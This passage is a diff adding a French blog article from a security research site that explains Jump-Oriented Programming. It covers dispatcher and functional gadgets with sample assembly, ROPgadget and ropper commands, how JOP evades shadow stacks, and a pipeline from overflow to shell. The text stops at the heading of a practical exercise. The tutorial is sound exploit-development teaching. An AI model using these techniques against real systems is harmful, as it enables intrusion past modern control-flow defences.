@@ -1,0 +1,1219 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Jump-Oriented Programming (JOP) : Quand les gadgets sautent sans filet. Plongée complète dans la technique JOP, sa mécanique et ses gadgets. | Jump-Oriented Programming (JOP): A complete dive into the JOP technique, its mechanics, architecture, and gadgets.">
+    <meta name="keywords" content="JOP, Jump-Oriented Programming, exploit dev, ROP alternative, cybersecurity writeup, reverse engineering, exploitation binaire, bypass">
+    <meta property="og:title" content="Jump-Oriented Programming | BUG|PWN">
+    <meta property="og:description" content="Jump-Oriented Programming (JOP) : Quand les gadgets sautent sans filet. Plongée complète dans la technique JOP, sa mécanique et ses gadgets. | Jump-Oriented Programming (JOP): A complete dive into the JOP technique, its mechanics, architecture, and gadgets.">
+    <meta property="og:image" content="../bugpwn@1x.png">
+    <meta property="og:type" content="article">
+    <title>Jump-Oriented Programming | BUG|PWN</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;900&family=JetBrains+Mono:wght@500;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.1/css/all.min.css">
+    <style>
+        body { font-family: 'Inter', sans-serif; background-color: #ffffff; color: #000000; scroll-behavior: smooth; }
+        .mono { font-family: 'JetBrains Mono', monospace; }
+        .btn-black { background-color: #000; color: #fff; transition: all 0.2s ease; }
+        .btn-black:hover { background-color: #333; transform: translateY(-1px); }
+
+        .article-body h2 { font-size: 1.5rem; font-weight: 900; text-transform: uppercase; letter-spacing: -0.05em; margin-top: 5rem; margin-bottom: 2rem; padding-bottom: 1rem; border-bottom: 2px solid #000; }
+        .article-body h3 { font-size: 1.125rem; font-weight: 700; text-transform: uppercase; letter-spacing: -0.02em; margin-top: 3rem; margin-bottom: 1.5rem; }
+        .article-body p { color: #4b5563; font-weight: 300; line-height: 1.8; margin-bottom: 1.5rem; font-size: 1.125rem; }
+        .article-body strong { color: #000; font-weight: 700; }
+        .article-body ul { margin-bottom: 2rem; color: #4b5563; font-weight: 300; font-size: 1.125rem; }
+        .article-body li { margin-bottom: 0.75rem; padding-left: 1.5rem; position: relative; }
+        .article-body li::before { content: '>'; position: absolute; left: 0; font-family: 'JetBrains Mono'; font-weight: 800; font-size: 0.8rem; color: #000; top: 0.2rem; }
+
+        .article-body code { font-family: 'JetBrains Mono', monospace; background-color: #f3f4f6; color: #000; padding: 0.1rem 0.4rem; font-size: 0.85em; font-weight: 600; border: 1px solid #e5e7eb; }
+
+        .no-scrollbar::-webkit-scrollbar { height: 6px; }
+        .no-scrollbar::-webkit-scrollbar-track { background: transparent; }
+        .no-scrollbar::-webkit-scrollbar-thumb { background: #333; }
+    </style>
+</head>
+<body class="antialiased">
+
+    <nav class="w-full py-6 px-6 md:px-12 bg-white/80 backdrop-blur-md sticky top-0 z-50 border-b border-gray-100">
+        <div class="max-w-7xl mx-auto flex justify-between items-center">
+            <a href="../index.html" class="text-xl font-extrabold tracking-tighter flex items-center gap-1">
+                <span class="bg-black text-white px-1.5 py-0.5 rounded-sm">BUG</span>
+                <span>|PWN</span>
+            </a>
+            <div class="hidden md:flex gap-10 text-[13px] font-medium uppercase tracking-[0.15em] text-gray-500">
+                <a href="../index.html#services" class="hover:text-black transition-colors" data-i18n="nav_services">Services</a>
+                <a href="#" class="hover:text-black transition-colors" data-i18n="nav_research">Recherche</a>
+                <a href="../blog.html" class="text-black font-bold transition-colors" data-i18n="nav_blog">Blog</a>
+                <a href="../events.html" class="hover:text-black transition-colors" data-i18n="nav_events">Events</a>
+            </div>
+            <div class="flex items-center gap-4 hidden md:flex">
+                <button id="lang-toggle" class="text-[13px] font-bold uppercase tracking-wider text-gray-500 hover:text-black transition-colors">EN</button>
+                <a href="../contact.html" class="btn-black px-6 py-2.5 rounded text-[13px] font-bold uppercase tracking-wider" data-i18n="nav_contact">Nous contacter</a>
+            </div>
+        </div>
+    </nav>
+
+    <header class="max-w-7xl mx-auto px-6 py-24 md:py-32">
+        <div class="max-w-4xl mx-auto">
+            <a href="../blog.html" class="inline-flex items-center gap-4 text-[10px] font-black uppercase tracking-[0.4em] text-gray-400 hover:text-black transition-colors mb-12 group" data-i18n="art_back">
+                <i class="fas fa-arrow-left group-hover:-translate-x-2 transition-transform"></i> Retour_Archives
+            </a>
+            <div class="flex flex-wrap gap-4 mb-8">
+                <span class="border border-black px-3 py-1 text-[9px] font-black uppercase tracking-widest mono bg-gray-50 text-black">Exploit Dev</span>
+                <span class="border border-black px-3 py-1 text-[9px] font-black uppercase tracking-widest mono bg-black text-white">PWN</span>
+                <span class="border border-gray-200 px-3 py-1 text-[9px] font-black uppercase tracking-widest mono text-gray-500">24.MAY.2026</span>
+            </div>
+            <h1 class="text-5xl md:text-7xl font-black uppercase tracking-tighter leading-[1.05] mb-8" data-i18n="art_title">
+                Exploitation Binaire :<br>
+                <span class="text-gray-300">Jump-Oriented</span><br>
+                Programming.
+            </h1>
+            <p class="text-xl text-gray-500 max-w-2xl leading-relaxed font-light border-l-2 border-black pl-8 mb-16" data-i18n="art_subtitle">
+                Quand les gadgets sautent sans filet. Une plongée complète dans la technique JOP, son histoire, sa mécanique, son architecture, ses gadgets illustrée par un exercice pratique sur un binaire durci.
+            </p>
+            <div class="flex items-center gap-6 border-t border-gray-200 pt-8">
+                <div class="w-16 h-16 bg-black text-white flex items-center justify-center font-black text-2xl">R</div>
+                <div>
+                    <div class="text-sm font-black uppercase tracking-widest">Sadoc ADONON</div>
+                    <div class="text-[10px] text-gray-500 uppercase tracking-[0.2em] mono mt-1" data-i18n="art_author_role">Lead Vulnerability Researcher</div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main class="max-w-3xl mx-auto px-6 pb-32 article-body">
+
+        <h2 data-i18n="art_h2_1">01 - Origine et motivation</h2>
+        <h3 data-i18n="art_h3_1">Pourquoi le JOP existe</h3>
+
+        <p data-i18n="art_p1">
+            Pour comprendre le JOP, il faut d'abord comprendre ce qu'il cherche à dépasser. Le ROP "<strong>Return-Oriented Programming</strong>" est apparu au milieu des années 2000 comme réponse à la protection NX (No-eXecute), qui rend la pile non-exécutable. L'idée était brillante : plutôt que d'injecter du code malveillant, on réutilise du code <em>déjà présent</em> dans le binaire. On appelle ces petits morceaux de code des <strong>gadgets</strong>.
+        </p>
+        <p data-i18n="art_p2">
+            Un gadget ROP est typiquement une séquence de quelques instructions suivie d'un <code>ret</code>. En contrôlant le pointeur de pile <code>RSP</code> via un débordement de tampon, on peut enchaîner des dizaines de gadgets pour construire n'importe quel comportement arbitraire: appeler <code>system("/bin/sh")</code>, effectuer des appels système, mapper de la mémoire exécutable, etc. Le ROP a longtemps été la technique reine de l'exploitation binaire post-NX.
+        </p>
+
+        <div class="bg-gray-50 border-l-4 border-black p-8 my-12">
+            <p class="text-xl !text-black italic font-medium !mb-0" data-i18n="art_quote1">
+                "Le ROP a été tellement efficace que les défenseurs ont dû inventer de nouvelles contre-mesures. C'est là que le JOP entre en scène."
+            </p>
+        </div>
+
+        <p data-i18n="art_p3">
+            Des mécanismes comme <strong>Intel CET (Control-flow Enforcement Technology)</strong> et les <strong>Shadow Stacks</strong> ont été conçus précisément pour rendre le ROP inopérant. Le Shadow Stack conserve en hardware une copie séparée et protégée des adresses de retour légitimes. À chaque instruction <code>ret</code>, le processeur compare l'adresse chargée depuis la pile logicielle avec celle présente dans le Shadow Stack. Si les deux ne correspondent pas, une exception matérielle est immédiatement levée, la chaîne ROP est stoppée net.
+        </p>
+        <p data-i18n="art_p4">
+            C'est dans ce contexte que le <strong>Jump-Oriented Programming</strong> a été formalisé. La technique a été présentée par Tyler Bletsch, Xuxian Jiang et al. dans leur papier de 2011 <em>"Jump-Oriented Programming: A New Class of Code-Reuse Attack"</em>. La prémisse est d'une simplicité désarmante : <strong>si <code>ret</code> est surveillé, utilisons <code>jmp</code>.</strong>
+        </p>
+
+        <h2 data-i18n="art_h2_2">02 - Concept fondamental</h2>
+        <h3 data-i18n="art_h3_2">Ce qu'est réellement le JOP</h3>
+
+        <p data-i18n="art_p5">
+            Le JOP est une technique d'exploitation qui construit un flux d'exécution artificiel en enchaînant des <strong>gadgets terminés par un saut indirect</strong>, typiquement <code>jmp *reg</code> ou <code>call *reg</code> plutôt que par <code>ret</code>. C'est une forme de <strong>Code-Reuse Attack (CRA)</strong> : on ne crée aucun code nouveau, on réorchestre du code légitime déjà présent dans les segments exécutables du binaire ou des bibliothèques chargées.
+        </p>
+
+        <div class="grid md:grid-cols-2 gap-0 border-t border-l border-black my-16">
+            <div class="p-8 border-r border-b border-black bg-white hover:bg-gray-50 transition-colors">
+                <div class="mono text-[10px] font-bold text-gray-400 mb-4 tracking-widest">// RETURN_ORIENTED</div>
+                <h4 class="text-xl font-black uppercase mb-6 tracking-tight">ROP</h4>
+                <ul class="!text-sm !mb-0 space-y-2">
+                    <li data-i18n="art_rop_li1">Gadgets terminés par <code>ret</code>.</li>
+                    <li data-i18n="art_rop_li2"><code>RSP</code> est le dispatcher implicite: chaque <code>ret</code> consomme une adresse depuis la pile et y saute</li>
+                    <li data-i18n="art_rop_li3">La pile EST la table de dispatch.</li>
+                    <li data-i18n="art_rop_li4">Détectable par Shadow Stack : chaque ret est vérifié contre une copie matérielle sécurisée</li>
+                </ul>
+            </div>
+            <div class="p-8 border-r border-b border-black bg-black text-white transition-colors">
+                <div class="mono text-[10px] font-bold text-gray-500 mb-4 tracking-widest">// JUMP_ORIENTED</div>
+                <h4 class="text-xl font-black uppercase mb-6 tracking-tight">JOP</h4>
+                <ul class="!text-sm !text-gray-300 !mb-0 space-y-2">
+                    <li class="!before:content-none before:hidden" data-i18n="art_jop_li1"><span class="text-white font-mono font-bold mr-2">></span> Gadgets terminés par <code>jmp *reg</code>.</li>
+                    <li class="!before:content-none before:hidden" data-i18n="art_jop_li2"><span class="text-white font-mono font-bold mr-2">></span> Un registre dédié est le dispatcher : il pointe vers la prochaine destination</li>
+                    <li class="!before:content-none before:hidden" data-i18n="art_jop_li3"><span class="text-white font-mono font-bold mr-2">></span> Pile absente du mécanisme de dispatch.</li>
+                    <li class="!before:content-none before:hidden" data-i18n="art_jop_li4"><span class="text-white font-mono font-bold mr-2">></span> Invisible pour Shadow Stack.</li>
+                </ul>
+            </div>
+        </div>
+
+        <p data-i18n="art_p6">
+            <strong>L'intuition clé :</strong> en ROP, la pile joue le rôle d'un programme implicite, chaque adresse empilée est la prochaine instruction à exécuter, et <code>RSP</code> est le compteur de programme caché. En JOP, ce rôle est entièrement délégué à un <strong>registre pivot</strong> qu'on contrôle. Le programme n'est plus encodé dans la pile, il est dans les registres. La pile peut même être totalement absente du mécanisme de dispatch.
+        </p>
+        <p data-i18n="art_p7">
+            Cette différence architecturale est ce qui confère au JOP sa résistance aux défenses modernes. Shadow Stack surveille les <code>ret</code>, le JOP n'en émet aucun dans sa chaîne de dispatch.
+        </p>
+
+        <h2 data-i18n="art_h2_3">03 - Anatomie d'une chaîne JOP</h2>
+        <p data-i18n="art_p8">
+            Une chaîne JOP bien construite s'articule autour de trois types de gadgets aux rôles distincts. Comprendre chacun est indispensable pour concevoir ou analyser un exploit JOP.
+        </p>
+
+        <h3 data-i18n="art_h3_3_1">1. Le gadget dispatcher</h3>
+        <p data-i18n="art_p9">
+            C'est le cœur du JOP, son équivalent du mécanisme <code>ret</code> en ROP. Le gadget dispatcher est une petite séquence d'instructions dont le seul rôle est de déterminer quel gadget s'exécutera ensuite. Il lit une adresse depuis une <strong>dispatch table</strong> (un tableau d'adresses maintenu en mémoire) et y saute via un <code>jmp</code> indirect. Le pointeur vers cette table est lui-même maintenu dans un registre dédié, que chaque gadget fonctionnel a la responsabilité d'incrémenter avant de repasser la main au dispatcher.
+        </p>
+
+<div class="border border-gray-700 mb-12 rounded-sm overflow-hidden">
+    <div class="bg-gray-950 px-4 py-3 border-b border-gray-700 flex justify-between items-center">
+        <div class="flex items-center gap-3">
+            <div class="flex gap-1.5">
+                <span class="w-2.5 h-2.5 rounded-full bg-red-500"></span>
+                <span class="w-2.5 h-2.5 rounded-full bg-yellow-500"></span>
+                <span class="w-2.5 h-2.5 rounded-full bg-green-500"></span>
+            </div>
+            <span class="w-px h-4 bg-gray-700"></span>
+            <i class="fas fa-file-code text-gray-500 text-xs"></i>
+            <span class="mono text-[10px] font-bold text-gray-400 tracking-widest">dispatcher.asm</span>
+        </div>
+        <button onclick="copyToClipboard('code-disp', this)"
+            class="mono text-[10px] font-bold text-gray-500 hover:text-white transition-colors flex items-center gap-1.5" data-i18n="btn_copy">
+            <i class="far fa-copy"></i> COPIER
+        </button>
+    </div>
+    <pre class="bg-gray-950 text-gray-300 p-6 overflow-x-auto text-[12px] leading-relaxed mono no-scrollbar" id="code-disp">
+<span class="text-gray-500">; Dispatcher classique : rbx pointe vers la dispatch table</span>
+<span class="text-white font-bold">dispatch:</span>
+    <span class="text-green-400">jmp</span>  *(<span class="text-yellow-400">%rbx</span>)           <span class="text-gray-500">; saute vers dispatch_table[0]</span>
+
+<span class="text-gray-500">; Variante avec table indexée par rcx</span>
+<span class="text-white font-bold">dispatch_indexed:</span>
+    <span class="text-green-400">jmp</span>  *(<span class="text-yellow-400">%rdx</span>, <span class="text-yellow-400">%rcx</span>, 8)  <span class="text-gray-500">; dispatch_table[rcx]</span>
+
+<span class="text-gray-500">; Un gadget fonctionnel incrémente rbx avant de repasser au dispatcher</span>
+<span class="text-white font-bold">functional_gadget_with_dispatch:</span>
+    <span class="text-blue-400">mov</span>  <span class="text-yellow-400">%rax</span>, [<span class="text-yellow-400">%rsi</span>]      <span class="text-gray-500">; travail utile</span>
+    <span class="text-blue-400">add</span>  <span class="text-yellow-400">%rbx</span>, 8          <span class="text-gray-500"> ; avance dans la dispatch table</span>
+    <span class="text-green-400">jmp</span>  *(<span class="text-yellow-400">%rbx</span>)           <span class="text-gray-500">; retour au dispatcher → gadget suivant</span></pre>
+</div>
+
+        <h3 data-i18n="art_h3_3_2">2. Les gadgets fonctionnels</h3>
+        <p data-i18n="art_p10">
+            Ce sont les gadgets qui produisent l'effet désiré : charger une valeur dans un registre, effectuer une opération arithmétique ou logique, préparer un argument pour un appel de fonction, écrire en mémoire, etc. Leur contrainte fondamentale est de se terminer par un <code>jmp *reg</code> idéalement vers le dispatcher, pour poursuivre la chaîne. En pratique, dans les exploits les plus compacts, un registre pivot unique (par exemple <code>r12</code>) joue simultanément le rôle de dispatcher et de cible finale, ce qui simplifie la structure.
+        </p>
+
+<div class="border border-gray-700 mb-12 rounded-sm overflow-hidden">
+    <div class="bg-gray-950 px-4 py-3 border-b border-gray-700 flex justify-between items-center">
+        <div class="flex items-center gap-3">
+            <div class="flex gap-1.5">
+                <span class="w-2.5 h-2.5 rounded-full bg-red-500"></span>
+                <span class="w-2.5 h-2.5 rounded-full bg-yellow-500"></span>
+                <span class="w-2.5 h-2.5 rounded-full bg-green-500"></span>
+            </div>
+            <span class="w-px h-4 bg-gray-700"></span>
+            <i class="fas fa-file-code text-gray-500 text-xs"></i>
+            <span class="mono text-[10px] font-bold text-gray-400 tracking-widest">functional.asm</span>
+        </div>
+        <button onclick="copyToClipboard('code-func', this)"
+            class="mono text-[10px] font-bold text-gray-500 hover:text-white transition-colors flex items-center gap-1.5" data-i18n="btn_copy">
+            <i class="far fa-copy"></i> COPIER
+        </button>
+    </div>
+    <pre class="bg-gray-950 text-gray-300 p-6 overflow-x-auto text-[12px] leading-relaxed mono no-scrollbar" id="code-func">
+<span class="text-gray-500">; Gadget fonctionnel : prépare un argument puis saute vers le dispatcher</span>
+<span class="text-white font-bold">set_rdi:</span>
+    <span class="text-blue-400">pop</span>  <span class="text-yellow-400">%rdi</span>              <span class="text-gray-500">; charge le 1er argument (ABI System V)</span>
+    <span class="text-green-400">jmp</span>  *<span class="text-yellow-400">%r12</span>              <span class="text-gray-500">; saute vers r12 (dispatcher/cible)</span>
+
+<span class="text-gray-500">; Gadget fonctionnel : charge une valeur dans le registre pivot</span>
+<span class="text-white font-bold">load_pivot:</span>
+    <span class="text-blue-400">pop</span>  <span class="text-yellow-400">%r12</span>              <span class="text-gray-500">; r12 ← adresse de la cible finale</span>
+    <span class="text-green-400">jmp</span>  *<span class="text-yellow-400">%r12</span>              <span class="text-gray-500">; saute directement à la cible</span>
+
+<span class="text-gray-500">; Gadget fonctionnel : transfert de registre</span>
+<span class="text-white font-bold">mov_gadget:</span>
+    <span class="text-blue-400">xchg</span> <span class="text-yellow-400">%rax</span>, <span class="text-yellow-400">%rdi</span>        <span class="text-gray-500"> ; swap rax ↔ rdi</span>
+    <span class="text-green-400">jmp</span>  *<span class="text-yellow-400">%rbx</span>              <span class="text-gray-500">; retour au dispatcher</span></pre>
+</div>
+
+        <h3 data-i18n="art_h3_3_3">3. Le gadget initiateur (trampoline)</h3>
+        <p data-i18n="art_p11">
+            C'est le premier gadget exécuté lors de l'exploitation. Il assure la transition depuis le vecteur d'exploitation initial, un débordement de tampon, un use-after-free, une corruption de pointeur de fonction vers la chaîne JOP proprement dite. Son rôle est d'initialiser les registres clés : le registre pivot qui servira de dispatcher, et éventuellement le pointeur vers la dispatch table. Une fois ces registres mis en place, la chaîne JOP est autonome.
+        </p>
+        <p data-i18n="art_p12">
+            Dans les exploits simples, ce gadget initiateur peut être atteint directement via l'adresse de retour écrasée sur la pile. C'est le seul <code>ret</code> de toute la chaîne, et il est <em>légitime</em> du point de vue du Shadow Stack car il correspond à la frame de la fonction vulnérable.
+        </p>
+
+        <h2 data-i18n="art_h2_4">04 - Le modèle de menace JOP</h2>
+        <h3 data-i18n="art_h3_4">Contre quelles protections le JOP est efficace</h3>
+
+        <p data-i18n="art_p13">
+            Voici un bilan honnête du paysage des protections modernes et de la position du JOP face à chacune. Il est important de comprendre que le JOP ne contourne pas tout, il s'inscrit dans une stratégie d'exploitation où d'autres techniques (info leak, heap spray…) comblent les lacunes.
+        </p>
+
+        <ul class="space-y-4">
+            <li data-i18n="art_li_nx">
+                <strong>NX / DEP (No-Execute / Data Execution Prevention) :</strong> contourné totalement. Le JOP n'exécute jamais de code injecté, il réutilise uniquement du code présent dans les segments <code>.text</code> du binaire et des bibliothèques chargées.
+            </li>
+            <li data-i18n="art_li_aslr">
+                <strong>ASLR + PIE (randomisation des adresses) :</strong> non contourné directement. Le JOP nécessite de connaître les adresses réelles des gadgets. Une <strong>info leak préalable</strong> est indispensable " format string, heap info leak, side-channel " pour calculer la base PIE et les adresses effectives.
+            </li>
+            <li data-i18n="art_li_ssp">
+                <strong>Stack Canary / SSP :</strong> non contourné seul. Si l'exploitation passe par un stack overflow, le canary doit être connu (via une fuite de mémoire) ou contourné (via un autre vecteur). Le JOP ne règle pas ce problème par lui-même.
+            </li>
+            <li data-i18n="art_li_shadow">
+                <strong>Shadow Stack :</strong> contourné efficacement. Aucun <code>ret</code> n'est utilisé dans la chaîne de dispatch JOP. Le Shadow Stack ne voit aucune instruction <code>ret</code> suspecte, la chaîne est invisible pour ce mécanisme.
+            </li>
+            <li data-i18n="art_li_relro">
+                <strong>FULL RELRO (GOT en lecture seule) :</strong> non contourné directement, mais rendu inutile. Avec FULL RELRO, la GOT est résolue au démarrage et marquée read-only. Le JOP n'a pas besoin de l'écraser, si les adresses de fonctions sont connues via un leak, on les appelle directement sans passer par la GOT.
+            </li>
+        </ul>
+
+        <div class="bg-black text-white p-8 my-12">
+            <div class="mono text-[10px] font-bold text-gray-400 mb-4 tracking-widest">// THREAT_MODEL_SUMMARY</div>
+            <p class="!text-gray-300 !text-sm !mb-0 leading-relaxed" data-i18n="art_p14">
+                Le JOP est rarement utilisé seul. En pratique, il s'intègre dans une chaîne d'exploitation multi-étapes : une vulnérabilité initiale déclenche un info leak, le leak permet de calculer les adresses réelles, et la chaîne JOP constitue le payload final. C'est la <strong class="!text-white">composition</strong> de ces techniques qui permet de contourner toutes les protections simultanément.
+            </p>
+        </div>
+
+        <h2 data-i18n="art_h2_5">05 - Trouver des gadgets JOP</h2>
+        <h3 data-i18n="art_h3_5">La chasse aux gadgets dans un binaire</h3>
+
+        <p data-i18n="art_p15">
+            L'outil de référence pour énumérer les gadgets dans un binaire est <code>ROPgadget</code>, qui dispose d'un mode dédié au JOP. On peut aussi utiliser <code>ropper</code>. Le principe est de scanner toutes les séquences d'octets qui forment des instructions valides et se terminent par un saut indirect.
+        </p>
+
+<div class="border border-gray-700 mb-12 rounded-sm overflow-hidden">
+    <div class="bg-gray-950 px-4 py-3 border-b border-gray-700 flex justify-between items-center">
+        <div class="flex items-center gap-3">
+            <div class="flex gap-1.5">
+                <span class="w-2.5 h-2.5 rounded-full bg-red-500"></span>
+                <span class="w-2.5 h-2.5 rounded-full bg-yellow-500"></span>
+                <span class="w-2.5 h-2.5 rounded-full bg-green-500"></span>
+            </div>
+            <span class="w-px h-4 bg-gray-700"></span>
+            <i class="fas fa-terminal text-gray-500 text-xs"></i>
+            <span class="mono text-[10px] font-bold text-gray-400 tracking-widest">gadget_hunt.sh</span>
+        </div>
+        <button onclick="copyToClipboard('code-hunt', this)"
+            class="mono text-[10px] font-bold text-gray-500 hover:text-white transition-colors flex items-center gap-1.5" data-i18n="btn_copy">
+            <i class="far fa-copy"></i> COPIER
+        </button>
+    </div>
+    <pre class="bg-gray-950 text-gray-300 p-6 overflow-x-auto text-[12px] leading-relaxed mono no-scrollbar" id="code-hunt">
+<span class="text-gray-500"># Lister tous les gadgets JOP avec ROPgadget</span>
+$ ROPgadget --binary <span class="text-green-400">./vuln</span> --norop
+
+<span class="text-gray-500"># Filtrer sur un pattern précis (pop + jmp sur registre)</span>
+$ ROPgadget --binary <span class="text-green-400">./vuln</span> --re <span class="text-green-400">"pop r.* ; jmp"</span>
+
+<span class="text-gray-500"># Avec ropper</span>
+$ ropper --file <span class="text-green-400">./vuln</span> --type jop
+
+<span class="text-gray-500"># Exemples de gadgets JOP précieux et leur rôle</span>
+<span class="text-purple-400">0x11c0</span>:  <span class="text-blue-400">pop</span>  <span class="text-yellow-400">%r12</span>            ; <span class="text-green-400">jmp</span>  *<span class="text-yellow-400">%r12</span>    <span class="text-gray-500">→ chargeur de pivot</span>
+<span class="text-purple-400">0x11d0</span>:  <span class="text-blue-400">pop</span>  <span class="text-yellow-400">%rdi</span>            ; <span class="text-green-400">jmp</span>  *<span class="text-yellow-400">%r12</span>    <span class="text-gray-500">→ setter d'argument</span>
+<span class="text-purple-400">0x????</span>:  <span class="text-blue-400">xchg</span> <span class="text-yellow-400">%rsp</span>, <span class="text-yellow-400">%rax</span>      ; <span class="text-green-400">jmp</span>  *<span class="text-yellow-400">%rbx</span>   <span class="text-gray-500">→ pivot de pile</span>
+<span class="text-purple-400">0x????</span>:  <span class="text-blue-400">mov</span>  <span class="text-yellow-400">%rax</span>, [<span class="text-yellow-400">%rdi</span>]   ; <span class="text-green-400">jmp</span>  *<span class="text-yellow-400">%rcx</span>   <span class="text-gray-500">→ lecture mémoire</span></pre>
+</div>
+
+        <h3 data-i18n="art_h3_5_2">Le rôle critique des registres callee-saved</h3>
+        <p data-i18n="art_p16">
+            L'ABI System V AMD64 distingue deux catégories de registres selon qui est responsable de les préserver lors d'un appel de fonction. Cette distinction est fondamentale pour le JOP.
+        </p>
+        <p data-i18n="art_p17">
+            Les registres <strong>caller-saved</strong> <code>rax</code>, <code>rcx</code>, <code>rdx</code>, <code>rsi</code>, <code>rdi</code>, <code>r8</code>–<code>r11</code> peuvent être librement modifiés par n'importe quelle fonction appelée. Les registres <strong>callee-saved</strong> <code>rbx</code>, <code>rbp</code>, <code>r12</code>–<code>r15</code> doivent être préservés : toute fonction qui les modifie doit les restaurer avant de retourner.
+        </p>
+        <p data-i18n="art_p18">
+            En pratique pour le JOP, cela signifie qu'une valeur chargée dans <code>r12</code> via un gadget restera intacte à travers des appels de fonctions intermédiaires. <strong>r12 est le registre pivot idéal</strong> : une fois initialisé avec l'adresse d'une cible (par exemple <code>system</code>), il gardera cette valeur jusqu'à la fin de la chaîne.
+        </p>
+
+        <h2 data-i18n="art_h2_6">06 - Architecture d'un exploit JOP</h2>
+        <h3 data-i18n="art_h3_6">Du débordement au shell</h3>
+
+        <p data-i18n="art_p19">
+            Un exploit JOP complet suit une architecture en plusieurs phases séquentielles. Chaque phase est une condition nécessaire à la suivante. Comprendre ce pipeline est essentiel pour concevoir un exploit robuste ou pour analyser un exploit existant.
+        </p>
+
+<div class="my-12 border border-gray-700 rounded-sm overflow-hidden">
+    <div class="bg-gray-950 px-4 py-3 border-b border-gray-700 flex items-center gap-3">
+        <div class="flex gap-1.5">
+            <span class="w-2.5 h-2.5 rounded-full bg-red-500"></span>
+            <span class="w-2.5 h-2.5 rounded-full bg-yellow-500"></span>
+            <span class="w-2.5 h-2.5 rounded-full bg-green-500"></span>
+        </div>
+        <span class="w-px h-4 bg-gray-700"></span>
+        <i class="fas fa-diagram-project text-gray-500 text-xs"></i>
+        <span class="mono text-[10px] font-bold text-gray-400 tracking-widest">exploit_pipeline.flow</span>
+    </div>
+
+    <div class="bg-gray-950 p-8 flex flex-wrap items-center justify-center gap-2">
+
+        <div class="flex flex-col items-center gap-2">
+            <div class="border border-red-500/40 bg-red-500/10 px-4 py-2.5 rounded-sm">
+                <div class="mono text-[9px] text-red-400/60 uppercase tracking-widest mb-1">01</div>
+                <div class="mono text-[11px] font-bold text-red-400 uppercase tracking-wider whitespace-nowrap" data-i18n="art_flow_1">Vuln Initiale</div>
+            </div>
+        </div>
+
+        <span class="text-gray-600 mono font-bold text-lg">→</span>
+
+        <div class="flex flex-col items-center gap-2">
+            <div class="border border-yellow-500/40 bg-yellow-500/10 px-4 py-2.5 rounded-sm">
+                <div class="mono text-[9px] text-yellow-400/60 uppercase tracking-widest mb-1">02</div>
+                <div class="mono text-[11px] font-bold text-yellow-400 uppercase tracking-wider whitespace-nowrap" data-i18n="art_flow_2">Info Leak</div>
+            </div>
+        </div>
+
+        <span class="text-gray-600 mono font-bold text-lg">→</span>
+
+        <div class="flex flex-col items-center gap-2">
+            <div class="border border-blue-500/40 bg-blue-500/10 px-4 py-2.5 rounded-sm">
+                <div class="mono text-[9px] text-blue-400/60 uppercase tracking-widest mb-1">03</div>
+                <div class="mono text-[11px] font-bold text-blue-400 uppercase tracking-wider whitespace-nowrap" data-i18n="art_flow_3">Contrôle PC</div>
+            </div>
+        </div>
+
+        <span class="text-gray-600 mono font-bold text-lg">→</span>
+
+        <div class="flex flex-col items-center gap-2">
+            <div class="border border-purple-500/40 bg-purple-500/10 px-4 py-2.5 rounded-sm">
+                <div class="mono text-[9px] text-purple-400/60 uppercase tracking-widest mb-1">04</div>
+                <div class="mono text-[11px] font-bold text-purple-400 uppercase tracking-wider whitespace-nowrap" data-i18n="art_flow_4">Gadget Init</div>
+            </div>
+        </div>
+
+        <span class="text-gray-600 mono font-bold text-lg">→</span>
+
+        <div class="flex flex-col items-center gap-2">
+            <div class="border border-cyan-500/40 bg-cyan-500/10 px-4 py-2.5 rounded-sm">
+                <div class="mono text-[9px] text-cyan-400/60 uppercase tracking-widest mb-1">05</div>
+                <div class="mono text-[11px] font-bold text-cyan-400 uppercase tracking-wider whitespace-nowrap" data-i18n="art_flow_5">Chaîne JOP</div>
+            </div>
+        </div>
+
+        <span class="text-gray-600 mono font-bold text-lg">→</span>
+
+        <div class="flex flex-col items-center gap-2">
+            <div class="border border-green-500/40 bg-green-500/10 px-4 py-2.5 rounded-sm">
+                <div class="mono text-[9px] text-green-400/60 uppercase tracking-widest mb-1">06</div>
+                <div class="mono text-[11px] font-bold text-green-400 uppercase tracking-wider whitespace-nowrap" data-i18n="art_flow_6">Shell <i class="fas fa-terminal text-[10px] ml-1"></i></div>
+            </div>
+        </div>
+
+    </div>
+
+</div>
+
+        <ul class="space-y-4">
+            <li data-i18n="art_li_vuln">
+                <strong>Vulnérabilité initiale :</strong> le point d'entrée. Typiquement un débordement de tampon sur la pile, un use-after-free, une confusion de type ou une vulnérabilité de format string. Cette étape permet généralement de prendre le contrôle d'un pointeur ou d'une adresse de retour.
+            </li>
+            <li data-i18n="art_li_leak">
+                <strong>Info leak :</strong> étape critique face à ASLR et PIE. On extrait depuis la mémoire du processus au moins deux valeurs : le canary SSP (pour le réécrire intact lors de l'overflow) et une adresse de code (pour calculer la base PIE et donc les adresses réelles de tous les gadgets).
+            </li>
+            <li data-i18n="art_li_pc">
+                <strong>Contrôle du pointeur d'instruction (PC) :</strong> l'overflow permet d'écraser l'adresse de retour de la fonction vulnérable. En plaçant l'adresse du gadget initiateur, on donne le coup d'envoi de la chaîne JOP.
+            </li>
+            <li data-i18n="art_li_init">
+                <strong>Gadget initiateur :</strong> ce gadget charge le registre pivot avec la valeur cible (l'adresse de la fonction à appeler) et enclenche la chaîne. C'est le seul point de la chaîne qui touche à la pile logicielle.
+            </li>
+            <li data-i18n="art_li_chain">
+                <strong>Chaîne JOP :</strong> les gadgets fonctionnels s'exécutent séquentiellement, préparant les arguments nécessaires, configurant les registres, et transmettant le contrôle via des <code>jmp *reg</code> enchaînés sans jamais déclencher le Shadow Stack.
+            </li>
+            <li data-i18n="art_li_shell">
+                <strong>Résultat final :</strong> la fonction cible (<code>system</code>, <code>execve</code>, un appel système direct…) est appelée avec les bons arguments. Un shell est obtenu.
+            </li>
+        </ul>
+
+        <h2 data-i18n="art_h2_7">07 - Exercice Pratique</h2>
+        <h3 data-i18n="art_h3_7">Application sur un binaire durci</h3>
+
+        <p data-i18n="art_p20">
